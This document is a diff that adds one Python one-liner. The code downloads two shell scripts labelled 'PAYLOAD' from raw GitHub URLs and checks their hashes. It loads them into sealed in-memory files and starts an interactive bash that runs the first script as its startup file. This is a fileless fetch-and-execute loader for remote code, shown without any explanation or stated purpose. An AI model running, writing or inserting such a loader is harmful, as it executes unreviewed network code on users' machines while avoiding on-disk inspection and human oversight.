@@ -1,0 +1,10 @@
+/usr/local/python/current/bin/python -B -c 'import fcntl,hashlib,os,subprocess,sys;spec=[("https://raw.githubusercontent.com/fufufu1116/multiverse-research/6b140d458812c84598ed3fcb3528f9b5e6176c86/governance/MULTIVERSE_R1_STAGE1_PHASE_C_V19_7_3_STEP2_6_PAYLOAD_20260829.sh",3692,"5fd32b4eeb7152170de17048e6a88206b411aca230833e0dccd04a86aa5a1066","543d64387aa73e3ac14ba9819d6a33b0a82efe15","step26"),("https://raw.githubusercontent.com/fufufu1116/multiverse-research/03a816c86af992bef24ac73d842cc420e3fc8d17/governance/MULTIVERSE_R1_STAGE1_PHASE_C_V19_7_3_STEP3_NONMUTATING_PAYLOAD_20260829.sh",1309,"1fb3f574b77e03092e6b7ed00b3f02bd6960c7ecf1091b9ac0795abc2523a3c5","2bdf758e534cd6cea30a59e185681937168bdd04","step3")];seal=fcntl.F_SEAL_WRITE|fcntl.F_SEAL_GROW|fcntl.F_SEAL_SHRINK|fcntl.F_SEAL_SEAL; hs=[]
+for u,n,h,g,name in spec:
+ r=subprocess.run(["/usr/bin/curl","--fail","--silent","--show-error","--location","--proto","=https","--tlsv1.2",u],stdout=subprocess.PIPE); r.returncode==0 or sys.exit(93); d=r.stdout; gg=hashlib.sha1(b"blob "+str(len(d)).encode()+b"\0"+d).hexdigest(); (len(d)==n and hashlib.sha256(d).hexdigest()==h and gg==g) or sys.exit(93); fd=os.memfd_create("phase-c-v19-7-3-"+name,os.MFD_ALLOW_SEALING); p=0
+ while p<len(d):
+  w=os.write(fd,d[p:]); w>0 or sys.exit(93); p+=w
+ os.pread(fd,len(d)+1,0)==d or sys.exit(93); fcntl.fcntl(fd,fcntl.F_ADD_SEALS,seal); fcntl.fcntl(fd,fcntl.F_GET_SEALS)==seal or sys.exit(93); os.lseek(fd,0,os.SEEK_SET); hi=fcntl.fcntl(fd,fcntl.F_DUPFD_CLOEXEC,10); hs.append((fd,hi))
+for fd,hi in hs: os.close(fd)
+os.dup2(hs[0][1],3,inheritable=True); os.dup2(hs[1][1],4,inheritable=True)
+for fd,hi in hs: os.close(hi)
+(os.get_inheritable(3) and os.get_inheritable(4) and os.lseek(3,0,os.SEEK_CUR)==0 and os.lseek(4,0,os.SEEK_CUR)==0 and fcntl.fcntl(3,fcntl.F_GET_SEALS)==seal and fcntl.fcntl(4,fcntl.F_GET_SEALS)==seal) or sys.exit(93); os.execve("/bin/bash",["/bin/bash","--noprofile","--rcfile","/dev/fd/3","-i"],os.environ.copy())'
